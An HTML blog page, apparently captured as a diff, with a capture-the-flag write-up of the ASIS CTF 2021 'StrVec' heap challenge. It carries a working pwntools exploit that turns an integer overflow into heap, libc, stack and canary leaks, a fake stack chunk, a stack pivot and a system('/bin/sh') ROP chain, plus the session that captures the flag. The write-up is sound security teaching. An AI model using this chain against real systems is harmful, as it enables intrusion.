@@ -1,0 +1,503 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>asis ctf 2021 - StrVec | kileak</title>
+
+
+
+
+
+<meta name="description" content="asis ctf 2021 - StrVec">
+
+
+<meta name="keywords" content="asis, strvec">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2021/asis21-strvec/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">asis ctf 2021 - StrVec</h1>
+      <p class="post-meta">Oct 23, 2021</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>StrVec
+<!--break--></p>
+
+  <p>Description</p>
+
+  <p>How to implement secure array in C? Is it easy, right?</p>
+
+  <p>nc 168.119.108.148 12010</p>
+
+  <p>Attachment: <a href="https://kileak.github.io/assets/asis21/strvec/strvec.tar.gz">strvec.tar.gz</a> <a href="https://kileak.github.io/assets/asis21/strvec/xpl.py">xpl.py</a></p>
+
+  <p>Team: Super Guesser</p>
+</blockquote>
+
+<p><code class="language-plaintext highlighter-rouge">strvec</code> implemented a <code class="language-plaintext highlighter-rouge">vector</code> (array), which can store and return entries. On start, it will ask for a name (which will be put on the stack), and for the size of the array to use.</p>
+
+<p>I joined a bit late and <code class="language-plaintext highlighter-rouge">n0psledbyte</code> was working on it and pointed out, that passing a size of <code class="language-plaintext highlighter-rouge">0x20000000</code> will lead to an integer overflow in</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">vector</span> <span class="o">*</span><span class="nf">vector_new</span><span class="p">(</span><span class="kt">int</span> <span class="n">nmemb</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">nmemb</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
+        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+
+    <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">vector</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span> <span class="o">*</span> <span class="n">nmemb</span><span class="p">;</span>  <span class="c1">// integer overflow</span>
+    <span class="n">vector</span> <span class="o">*</span><span class="n">vec</span> <span class="o">=</span> <span class="p">(</span><span class="n">vector</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">vec</span><span class="p">)</span>
+        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+
+    <span class="n">memset</span><span class="p">(</span><span class="n">vec</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+    <span class="n">vec</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">=</span> <span class="n">nmemb</span><span class="p">;</span></code></pre></figure>
+
+<p>since <code class="language-plaintext highlighter-rouge">size</code> is defined as an <code class="language-plaintext highlighter-rouge">int</code>, the multiplication will overflow <code class="language-plaintext highlighter-rouge">size</code> and create a smaller chunk than expected. But the specified size <code class="language-plaintext highlighter-rouge">nmem</code> will be sotred in <code class="language-plaintext highlighter-rouge">vec-&gt;size</code>.</p>
+
+<p>Definitely something to work with. With this we can create a vector chunk and access data behind that chunk on the heap.</p>
+
+<p>So, let’s create a corrupted vector and one entry</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+    <span class="c1"># put fake chunk size into name
+</span>    <span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span>  <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">)[:</span><span class="mi">6</span><span class="p">]</span>
+
+    <span class="c1"># integer overflow (create chunk with huge size able to overflow)
+</span>    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"n = "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mh">0x20000020</span><span class="o">+</span><span class="p">(</span><span class="mh">0x690</span><span class="o">/</span><span class="mi">8</span><span class="p">)))</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
+
+    <span class="c1"># create one entry
+</span>    <span class="nb">set</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x555555559290:	0x0000000000000000	0x00000000000007a1 &lt;= size 0x7a0
+0x5555555592a0:	0x00000000200000f2	0x0000555555559a40 &lt;= vector / entry 0 ptr
+0x5555555592b0:	0x0000000000000000	0x0000000000000000
+0x5555555592c0:	0x0000000000000000	0x0000000000000000
+0x5555555592d0:	0x0000000000000000	0x0000000000000000
+0x5555555592e0:	0x0000000000000000	0x0000000000000000
+...
+0x555555559a10:	0x0000000000000000	0x0000000000000000
+0x555555559a20:	0x0000000000000000	0x0000000000000000
+0x555555559a30:	0x0000000000000000	0x0000000000000031 &lt;= entry 0
+0x555555559a40:	0x0000000000000000	0x0000000000000000
+0x555555559a50:	0x0000000000000000	0x0000000000000000
+0x555555559a60:	0x0000000000000000	0x00000000000205a1</code></pre></figure>
+
+<p>The vector chunk is only created with a size of <code class="language-plaintext highlighter-rouge">0x7a0</code> but <code class="language-plaintext highlighter-rouge">vec-&gt;size</code> shows, that we can use indices up to <code class="language-plaintext highlighter-rouge">0x00000000200000f2</code>, so we can now also create and read entries outside of this vector.</p>
+
+<p>To get a heap leak, we’ll create another entry and choose the index so, that the entry pointer will be put into our first chunk.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># create another entry inside of the chunk of entry 0
+</span><span class="nb">set</span><span class="p">((</span><span class="mh">0x555555559a40</span> <span class="o">-</span> <span class="mh">0x5555555592a8</span><span class="p">)</span><span class="o">/</span><span class="mi">8</span><span class="p">,</span> <span class="s">"A"</span><span class="p">)</span>
+
+<span class="c1"># can leak heap address now via entry 0
+</span><span class="n">HEAPLEAK</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">get</span><span class="p">(</span><span class="mi">0</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"HEAP       : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">HEAPLEAK</span><span class="p">))</span></code></pre></figure>
+
+<p>The next entry will be allocated after the first entry and the pointer to it will be stored inside the first entry, so we can just read it from there.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x555555559290:	0x0000000000000000	0x00000000000007a1
+0x5555555592a0:	0x00000000200000f2	0x0000555555559a40  &lt;= vector / entry 0 ptr
+0x5555555592b0:	0x0000000000000000	0x0000000000000000
+0x5555555592c0:	0x0000000000000000	0x0000000000000000
+0x555555559a10:	0x0000000000000000	0x0000000000000000
+0x555555559a20:	0x0000000000000000	0x0000000000000000
+0x555555559a30:	0x0000000000000000	0x0000000000000031
+0x555555559a40:	0x0000555555559a70	0x0000000000000000  &lt;= next entry ptr
+0x555555559a50:	0x0000000000000000	0x0000000000000000
+0x555555559a60:	0x0000000000000000	0x0000000000000031
+0x555555559a70:	0x0000000000000041	0x0000000000000000  &lt;= next entry
+0x555555559a80:	0x0000000000000000	0x0000000000000000
+0x555555559a90:	0x0000000000000000	0x0000000000020571
+
+[*] HEAP       : 0x555555559a70</code></pre></figure>
+
+<p>Next, we need a libc leak, and we already got a chunk on the heap, which won’t fit into tcache…</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">vector</code> itself… So, we can just create a new entry, in which we store a pointer to the vector and then free it via the oob index access.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># write address of vector to heap
+</span><span class="nb">set</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">HEAPLEAK</span> <span class="o">-</span> <span class="mh">0x7d0</span><span class="p">))</span>  <span class="c1"># 0x5555555592a0
+</span>
+<span class="c1"># free vector itself
+</span><span class="nb">set</span><span class="p">((</span><span class="mh">0x555555559aa0</span><span class="o">-</span><span class="mh">0x5555555592a8</span><span class="p">)</span><span class="o">/</span><span class="mi">8</span><span class="p">,</span> <span class="s">"B"</span><span class="p">)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x555555559290:	0x0000000000000000	0x00000000000007a1
+0x5555555592a0:	0x00000000200000f2	0x0000555555559a40
+0x5555555592b0:	0x0000555555559aa0	0x0000000000000000
+0x5555555592c0:	0x0000000000000000	0x0000000000000000
+...
+0x555555559a20:	0x0000000000000000	0x0000000000000000
+0x555555559a30:	0x0000000000000000	0x0000000000000031
+0x555555559a40:	0x0000555555559a70	0x0000000000000000
+0x555555559a50:	0x0000000000000000	0x0000000000000000
+0x555555559a60:	0x0000000000000000	0x0000000000000031
+0x555555559a70:	0x0000000000000041	0x0000000000000000
+0x555555559a80:	0x0000000000000000	0x0000000000000000
+0x555555559a90:	0x0000000000000000	0x0000000000000031
+0x555555559aa0:	0x00005555555592a0	0x0000000000000000
+0x555555559ab0:	0x0000000000000000	0x0000000000000000
+0x555555559ac0:	0x0000000000000000	0x0000000000020541</code></pre></figure>
+
+<p>After freeing the vector:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x555555559290:	0x0000000000000000	0x00000000000007a1
+0x5555555592a0:	0x00007ffff7fc2be0	0x00007ffff7fc2be0  &lt;= main_arena ptr
+0x5555555592b0:	0x0000000000000000	0x0000000000000000
+0x5555555592c0:	0x0000000000000000	0x0000000000000000
+0x5555555592d0:	0x0000000000000000	0x0000000000000000
+0x5555555592e0:	0x0000000000000000	0x0000000000000000
+0x5555555592f0:	0x0000000000000000	0x0000000000000000</code></pre></figure>
+
+<p>Now, we can create a new entry, which will be put into the just freed vector chunk (overwriting <code class="language-plaintext highlighter-rouge">vector-&gt;size</code>), and moving the libc addresses further down the heap, so we can access them again via a valid index</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># allocate new entry inside of vector (will push libc address further)
+</span><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x20000200</span><span class="p">)</span>       <span class="c1"># new size
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
+
+<span class="nb">set</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x555555559290:	0x0000000000000000	0x0000000000000031
+0x5555555592a0:	0x0000000020000200	0x00005555555592a0  &lt;= vector
+0x5555555592b0:	0x0000555555559200	0x0000555555559290
+0x5555555592c0:	0x0000000000000000	0x0000000000000771
+0x5555555592d0:	0x00007ffff7fc2be0	0x00007ffff7fc2be0  &lt;= bin
+0x5555555592e0:	0x0000000000000000	0x0000000000000000
+0x5555555592f0:	0x0000000000000000	0x0000000000000000
+0x555555559300:	0x0000000000000000	0x0000000000000000
+0x555555559310:	0x0000000000000000	0x0000000000000000</code></pre></figure>
+
+<p>Similar to the heap leak, we can now write a pointer to <code class="language-plaintext highlighter-rouge">0x5555555592d0</code> on the heap and read it via oob access.</p>
+
+<p>We just have to take into consideration, that this will create a new chunk (<code class="language-plaintext highlighter-rouge">0x31</code>) in the current freed bin, so the address we want to leak will then be at <code class="language-plaintext highlighter-rouge">0x555555559300</code>.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># create a note entry pointing to libc address
+</span><span class="nb">set</span><span class="p">(</span><span class="mi">20</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">HEAPLEAK</span> <span class="o">-</span> <span class="mh">0x770</span><span class="p">))</span>    
+
+<span class="n">LIBCLEAK</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">get</span><span class="p">(</span><span class="mi">5</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="o">=</span><span class="n">LIBCLEAK</span> <span class="o">-</span> <span class="mi">96</span> <span class="o">-</span> <span class="mh">0x10</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"__malloc_hook"</span><span class="p">]</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC leak  : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">LIBCLEAK</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC       : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x555555559290:	0x0000000000000000	0x0000000000000031
+0x5555555592a0:	0x0000000020000200	0x00005555555592a0  &lt;= vector
+0x5555555592b0:	0x0000555555559200	0x0000555555559290
+0x5555555592c0:	0x0000000000000000	0x0000000000000031
+0x5555555592d0:	0x0000555555559300	0x00007ffff7fc2b00  &lt;= entry pointing to freed bin
+0x5555555592e0:	0x0000000000000000	0x0000000000000000
+0x5555555592f0:	0x0000000000000000	0x0000000000000741
+0x555555559300:	0x00007ffff7fc2be0	0x00007ffff7fc2be0  &lt;= main_arena ptr
+0x555555559310:	0x0000000000000000	0x0000000000000000
+0x555555559320:	0x0000000000000000	0x0000000000000000
+0x555555559330:	0x0000000000000000	0x0000000000000000
+0x555555559340:	0x0000000000000000	0x00005555555592d0
+0x555555559350:	0x0000000000000000	0x0000000000000000
+
+[*] LIBC leak  : 0x7ffff7fc2be0
+[*] LIBC       : 0x7ffff7dd7000</code></pre></figure>
+
+<p>Since we were asked to create a name on the stack in the beginning, I was quite sure, that we were meant to create a fake chunk on the stack and use that to get rip control.</p>
+
+<p>At the beginning, I had put a <code class="language-plaintext highlighter-rouge">0x31</code> fake chunk size in <code class="language-plaintext highlighter-rouge">name</code> for preparing this. But to be able to free a chunk on the stack, we first need a stack address. Well, since we now have heap and libc leak, we can use the same to read <code class="language-plaintext highlighter-rouge">environ</code> from libc.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># create a note entry pointing to environ
+</span><span class="nb">set</span><span class="p">(</span><span class="mi">30</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"environ"</span><span class="p">]))</span>
+
+<span class="n">STACK</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">get</span><span class="p">((</span><span class="mh">0x555555559300</span><span class="o">-</span><span class="mh">0x5555555592a8</span><span class="p">)</span><span class="o">/</span><span class="mi">8</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"STACK      : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">STACK</span><span class="p">))</span></code></pre></figure>
+
+<p>Though we cannot directly use this to create a chunk on the stack, since the binary is using a <code class="language-plaintext highlighter-rouge">canary</code>. But, same as before, we can just leak it (just have to “misalign” it by 1 byte, since the LSB of the canary will always be 0x0).</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># create a note entry pointing to fake chunk below name
+</span><span class="nb">set</span><span class="p">(</span><span class="mi">31</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">STACK</span> <span class="o">-</span> <span class="mh">0x118</span><span class="p">))</span>  
+
+<span class="c1"># create a note entry pointing to canary+1
+</span><span class="nb">set</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">STACK</span> <span class="o">-</span> <span class="mh">0x10f</span><span class="p">))</span>  
+
+<span class="c1"># leak canary
+</span><span class="n">CANARY</span><span class="o">=</span><span class="n">u64</span><span class="p">((</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="o">+</span><span class="n">get</span><span class="p">((</span><span class="mh">0x555555559360</span><span class="o">-</span><span class="mh">0x5555555592a8</span><span class="p">)</span><span class="o">/</span><span class="mi">8</span><span class="p">)).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"CANARY     : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">CANARY</span><span class="p">))</span></code></pre></figure>
+
+<p>I have already put the address to our “fake chunk” on the stack on the heap, so now we can just <code class="language-plaintext highlighter-rouge">free</code> it.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># free "stack" note
+</span><span class="nb">set</span><span class="p">((</span><span class="mh">0x555555559330</span><span class="o">-</span><span class="mh">0x5555555592a8</span><span class="p">)</span><span class="o">/</span><span class="mi">8</span><span class="p">,</span> <span class="s">"A"</span><span class="p">)</span></code></pre></figure>
+
+<p>Memory before freeing the stack note</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x555555559290:	0x0000000000000000	0x0000000000000031
+0x5555555592a0:	0x0000000020000200	0x00005555555592a0
+0x5555555592b0:	0x0000555555559200	0x0000555555559290
+0x5555555592c0:	0x0000000000000000	0x0000000000000031
+0x5555555592d0:	0x0000555555559300	0x00007ffff7fc2b00
+0x5555555592e0:	0x0000000000000000	0x0000000000000000
+0x5555555592f0:	0x0000000000000000	0x0000000000000031
+0x555555559300:	0x00007ffff7fc62e0	0x00007ffff7fc2b00
+0x555555559310:	0x0000000000000000	0x0000000000000000
+0x555555559320:	0x0000000000000000	0x0000000000000031
+0x555555559330:	0x00007fffffffed40	0x00007ffff7fc2b00  &lt;= ptr to fake chunk
+0x555555559340:	0x0000000000000000	0x0000000000000000
+0x555555559350:	0x0000000000000000	0x0000000000000031
+0x555555559360:	0x00007fffffffed49	0x00007ffff7fc2b00  &lt;= ptr for canary leak
+0x555555559370:	0x0000000000000000	0x0000000000000000
+0x555555559380:	0x0000000000000000	0x00000000000006b1
+
+gef➤  x/30gx 0x00007fffffffed40-0x10
+0x7fffffffed30:	0x0000000000000000	0x0000000000000031  &lt;= fake size (name)
+0x7fffffffed40:	0x00007fffffffee40	0x3ea97d39562b1e00  &lt;= fake chunk
+0x7fffffffed50:	0x0000000000000000	0x00007ffff7dfe0b3
+0x7fffffffed60:	0x00007ffff7ffc620	0x00007fffffffee48
+0x7fffffffed70:	0x0000000100000000	0x00005555555554af</code></pre></figure>
+
+<p>and after</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gef➤  x/30gx 0x00007fffffffed40-0x10
+0x7fffffffed30:	0x0000000000000000	0x0000000000000031
+0x7fffffffed40:	0x0000000000000000	0x0000555555559010  &lt;= freed fake chunk
+0x7fffffffed50:	0x0000000000000000	0x00007ffff7dfe0b3
+0x7fffffffed60:	0x00007ffff7ffc620	0x00007fffffffee48
+0x7fffffffed70:	0x0000000100000000	0x00005555555554af
+
+tcache
+
+0x555555559000:	0x0000000000000000	0x0000000000000291
+0x555555559010:	0x0000000000010000	0x0000000000000000
+0x555555559020:	0x0000000000000000	0x0000000000000000
+0x555555559030:	0x0000000000000000	0x0000000000000000
+0x555555559040:	0x0000000000000000	0x0000000000000000
+0x555555559050:	0x0000000000000000	0x0000000000000000
+0x555555559060:	0x0000000000000000	0x0000000000000000
+0x555555559070:	0x0000000000000000	0x0000000000000000
+0x555555559080:	0x0000000000000000	0x0000000000000000
+0x555555559090:	0x0000000000000000	0x00007fffffffed40  &lt;= pointer to stack chunk
+0x5555555590a0:	0x0000000000000000	0x0000000000000000</code></pre></figure>
+
+<p>With all the leaks at hand, we can now allocate the stack chunk, overwrite canary, rbp and return address of <code class="language-plaintext highlighter-rouge">main</code>, but since our chunks can only be <code class="language-plaintext highlighter-rouge">0x20</code> big, we cannot do a real ropchain here (can only put one gadget there).</p>
+
+<p>But well, we can put a heap address into <code class="language-plaintext highlighter-rouge">rbp</code> and overwrite the return address just with <code class="language-plaintext highlighter-rouge">leave</code>, which will pivot the stack into the heap, where we can have a prepared (slightly bigger) ropchain :)</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">LEAVE</span><span class="o">=</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x000000000005aa48</span>
+<span class="n">POPRDI</span><span class="o">=</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x0000000000026b72</span>
+
+<span class="c1"># put heap pivot payload into ret
+</span><span class="n">payload</span><span class="o">=</span><span class="s">"A"</span><span class="o">*</span><span class="mi">8</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">CANARY</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">HEAPLEAK</span> <span class="o">+</span> <span class="mh">0xcc0</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">LEAVE</span><span class="p">)[:</span><span class="mi">6</span><span class="p">]</span>
+
+<span class="c1"># will be allocated on stack overwriting ret
+</span><span class="nb">set</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="c1"># put ropchain on heap (system("/bin/sh"))
+</span><span class="n">payload</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="n">POPRDI</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">)))</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"system"</span><span class="p">])</span>
+
+<span class="nb">set</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span></code></pre></figure>
+
+<p>Exiting the challenge now will crash though, since <code class="language-plaintext highlighter-rouge">system</code> will add a bigger stack frame and <code class="language-plaintext highlighter-rouge">rsp</code> will access unmapped memory outside of <code class="language-plaintext highlighter-rouge">heap</code>. So, let’s just allocate “some” more notes to get our ropchain a little bit further down the heap.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># fill up the heap to enlarge available stack
+</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
+    <span class="nb">set</span><span class="p">(</span><span class="mi">800</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span></code></pre></figure>
+
+<p>With this, we’ll have enough space above our ropchain, so this should no longer be a problem.</p>
+
+<p>Only one thing missing…</p>
+
+<p>Exiting the challenge will try to cleanup the <code class="language-plaintext highlighter-rouge">vector</code> (by calling <code class="language-plaintext highlighter-rouge">vector_delete</code>, which will iterate through the array and try to free every entry)… which will most likely fail completely and crash…</p>
+
+<p>So, you could either try to cleanup your vector manually, so all the <code class="language-plaintext highlighter-rouge">frees</code> will succeed or you take the easy way out :)</p>
+
+<p>Just reallocate our initial entry pointing to vector again. This will effectively set <code class="language-plaintext highlighter-rouge">vector-&gt;size</code> to <code class="language-plaintext highlighter-rouge">0x0</code>, thus <code class="language-plaintext highlighter-rouge">vector_delete</code> will not try to delete any entry chunk anymore and happily continue execution.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># reallocate note chunk pointing to vector (will overwrite vector size with 0)
+# this way, no frees will happen on exit, no need to cleanup
+</span><span class="nb">set</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">"AAAABBBB"</span><span class="p">)</span></code></pre></figure>
+
+<p>Now we can just exit the application, which will trigger our initial ropchain, which will pivot into the ropchain on the heap and execute <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code>.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python xpl.py 1
+[*] '/media/sf_ctf/asis21/strvec/strvec/libc-2.31.so'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to 168.119.108.148 on port 12010: Done
+[*] HEAP       : 0x5646fadf5a70
+[*] LIBC leak  : 0x7fb381193be0
+[*] LIBC       : 0x7fb380fa8000
+[*] STACK      : 0x7ffea25c5a98
+[*] CANARY     : 0x4cd6345db8e92600
+[*] Switching to interactive mode
+0
+1. get
+2. set
+&gt; Bye, !
+$ ls
+chall
+flag-970df57dcd98b545bb0b620bc4b6cab0.txt
+$ cat flag-970df57dcd98b545bb0b620bc4b6cab0.txt
+ASIS{n0_1d34_4_g00d_fl4g_t3xt_59723644e687a5c5e2fe80eae0b4f4b8}</code></pre></figure>
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=asis ctf 2021 - StrVec&amp;url=https://kileak.github.io/ctf/2021/asis21-strvec/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2021/asis21-strvec/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2021/asis21-strvec';
+        var disqus_title = 'asis ctf 2021 - StrVec';
+        var disqus_url = 'https://kileak.github.io/ctf/2021/asis21-strvec';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
